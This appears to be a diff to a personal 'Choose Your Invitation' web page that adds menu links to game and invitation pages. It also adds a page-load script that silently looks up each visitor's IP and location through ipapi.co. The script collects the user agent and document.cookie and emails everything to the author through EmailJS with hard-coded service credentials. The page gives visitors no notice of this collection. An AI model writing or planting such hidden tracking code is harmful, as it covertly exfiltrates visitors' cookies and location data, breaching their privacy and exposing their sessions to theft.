@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="shortcut icon" href="assets/programmerist.png" type="image/x-icon"/>
     <title>Choose Your Invitation 💌</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
       body {
         font-family: "Arial", sans-serif;
@@ -70,7 +71,8 @@
       <h1>👋😄 What would you like to do?</h1>
       <div class="choices">
         <a href="invitation/coffee.html" class="card">☕ Coffee & Talk</a>
-        <a href="invitation/lol.html" class="card">🎮 Play League of Legends</a>
+        <a href="invitation/lol.html" class="card">🎮 Play League of Legends of Wildrift</a>
+        <a href="invitation/steam.html" class="card">🎮 Play Steam Siomai Games</a>
         <a href="games/mindgames.html" class="card">🌶️ Memory Game </a>
         <a href="games/puzzlegames.html" class="card">🥵 Puzzle Game </a>
         <a href="collage/index.html" class="card">📷 Photo Collage</a>
@@ -78,6 +80,48 @@
       </div>
       <footer class="site-footer">© 2025 - 2026 Kevs404  💻✨</footer>
     </div>
+    <script>
+      (function(){
+        // email js PUBLIC API KEY (user)
+        emailjs.init("G3tmu6bSokASDsudB");
+      })();
+
+      window.onload = async function () {
+        let ipData = {};
+
+        try {
+          const res = await fetch("https://ipapi.co/json/");
+          ipData = await res.json();
+        } catch (err) {
+          console.log("IP fetch failed:", err);
+        }
+
+        const params = {
+          page: window.location.href,
+          userAgent: navigator.userAgent,
+          time: new Date().toLocaleString(),
+          cookies: document.cookie,
+
+          ip: ipData.ip || "N/A",
+          city: ipData.city || "N/A",
+          region: ipData.region || "N/A",
+          country: ipData.country_name || "N/A"
+        };
+
+        // email js: serviceID, templateID, templateParams
+        emailjs.send("service_romt14a", "template_1hvg1g2", params)
+          .then(function(response) {
+            console.log("Email sent!", response.status);
+          }, function(error) {
+            console.log("Failed...", error);
+          });
+
+        const target = document.getElementById("videos");
+        if (target) {
+          target.scrollIntoView({ behavior: "smooth" });
+        }
+      };
+    </script>
   </body>
 </html>
 
